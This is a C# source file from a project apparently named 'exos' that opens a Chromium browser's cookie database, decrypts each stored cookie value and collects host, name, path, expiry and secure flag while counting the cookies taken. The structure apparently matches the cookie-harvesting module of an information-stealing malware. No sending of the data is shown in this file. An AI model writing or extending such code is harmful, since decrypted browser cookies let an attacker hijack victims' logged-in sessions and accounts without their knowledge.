using System;
using System.Collections.Generic;

namespace exos.Chromium;

internal sealed class Cookies
{
	public static List<Cookie> Get(string sCookie)
	{
		List<Cookie> list = new List<Cookie>();
		try
		{
			SQLite sQLite = SqlReader.ReadTable(sCookie, "cookies");
			if (sQLite == null)
			{
				return list;
			}
			for (int i = 0; i < sQLite.GetRowCount(); i++)
			{
				Cookie item = default(Cookie);
				string value = sQLite.GetValue(i, 12);
				item.sValue = Crypto.EasyDecrypt(sCookie, value);
				if (string.IsNullOrEmpty(item.sValue))
				{
					item.sValue = sQLite.GetValue(i, 3);
				}
				item.sHostKey = Crypto.GetUTF8(sQLite.GetValue(i, 1));
				item.sName = Crypto.GetUTF8(sQLite.GetValue(i, 2));
				item.sPath = Crypto.GetUTF8(sQLite.GetValue(i, 4));
				item.sExpiresUtc = Crypto.GetUTF8(sQLite.GetValue(i, 5));
				item.sIsSecure = Crypto.GetUTF8(sQLite.GetValue(i, 6)).ToUpper();
				Counting.Cookies++;
				list.Add(item);
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("Error while reading cookies: " + ex.Message);
		}
		return list;
	}
}
